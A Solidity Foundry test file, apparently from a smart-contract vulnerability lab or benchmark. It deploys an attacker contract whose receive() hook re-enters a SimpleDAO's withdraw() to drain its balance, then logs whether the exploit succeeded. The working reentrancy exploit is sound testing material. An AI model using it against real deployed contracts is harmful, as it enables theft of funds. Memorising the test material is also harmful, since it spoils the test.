// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/simple_dao.sol";

contract Attacker {
    SimpleDAO private dao;
    uint256 private amount;
    bool private reentered;

    constructor(address _dao) {
        dao = SimpleDAO(_dao);
    }

    function attack(uint256 _amount) public {
        amount = _amount;
        reentered = false;
        dao.withdraw(_amount);
    }

    receive() external payable {
        if (!reentered && address(dao).balance >= amount) {
            reentered = true;
            dao.withdraw(amount);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract SimpleDAOReentrancyTest is Test {
    SimpleDAO public dao;
    Attacker public attacker;
    uint256 public constant TOTAL_FUNDING = 20 ether;

    function setUp() public {
        // Deploy contract
        dao = new SimpleDAO();

        // Fund the test contract
        vm.deal(address(this), TOTAL_FUNDING);

        // Deploy attacker contract
        attacker = new Attacker(address(dao));

        // Donate to attacker's credit
        dao.donate{value: TOTAL_FUNDING}(address(attacker));
    }

    function testReentrancyAttack() public {
        // Record initial states BEFORE attack
        uint256 daoBalanceBefore = address(dao).balance;
        uint256 attackerCreditBefore = dao.queryCredit(address(attacker));
        uint256 totalWithdrawalsBefore = dao.totalWithdrawals();
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("--- BEFORE-Trigger Attack ---");
        console.log("DAO balance: ", daoBalanceBefore);
        console.log("Attacker credit: ", attackerCreditBefore);
        console.log("Total withdrawals: ", totalWithdrawalsBefore);
        console.log("Attacker balance: ", attackerBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Execute reentrancy attack
        attacker.attack(10 ether);
        console.log("Attack executed");

        console.log("--- AFTER-Trigger Attack ---");
        // Record states AFTER attack
        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerCreditAfter = dao.queryCredit(address(attacker));
        uint256 totalWithdrawalsAfter = dao.totalWithdrawals();
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("DAO balance: ", daoBalanceAfter);
        console.log("Attacker credit: ", attackerCreditAfter);
        console.log("Total withdrawals: ", totalWithdrawalsAfter);
        console.log("Attacker balance: ", attackerBalanceAfter);

        // Compare states
        bool daoBalanceChanged = daoBalanceAfter == 0;
        bool creditZeroed = attackerCreditAfter == 0;
        bool withdrawalsChanged = totalWithdrawalsAfter == 20 ether;
        bool attackerEnriched = attackerBalanceAfter == attackerBalanceBefore + 20 ether;
        
        // Vulnerability exists if ALL states changed as expected
        bool exploited = daoBalanceChanged && creditZeroed && 
                         withdrawalsChanged && attackerEnriched;

        // Final vulnerability verdict
        if (exploited) {
            console.log("Vulnerability Exists: Successful reentrancy attack drained the contract");
        } else {
            console.log("Vulnerability not Exist: Attack did not alter states as expected");
        }
    }
}